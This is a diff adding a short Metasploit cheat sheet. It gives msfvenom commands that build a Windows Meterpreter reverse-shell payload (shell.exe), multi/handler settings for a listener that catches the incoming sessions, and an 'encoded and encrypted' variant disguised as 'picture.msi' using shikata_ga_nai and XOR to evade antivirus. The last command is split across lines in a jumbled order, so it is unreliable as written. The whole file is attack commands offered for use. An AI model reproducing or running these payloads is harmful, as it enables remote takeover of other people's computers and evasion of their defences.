@@ -1,0 +1,19 @@
+Create simple payload:
+---------------------------
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> 
+LPORT=<Your Port to Connect On> -f exe > shell.exe
+
+
+AFTER CREATING PAYLOAD OPEN MSFCONSOLE AND LISTEN TO THE PORT:
+----------------------------
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <LHOST value>
+set LPORT <LPORT value>
+set ExitOnSession false
+
+
+A good Encoded and encrypted exemple:
+----------------------------------
+msfvenom LHOST=192.168.176.130 LPORT=4444 -f msi > picture.msi 
+-p windows/meterpreter/reverse_tcp -encrypt xor --platform windows -e x86/shikata_ga_nai
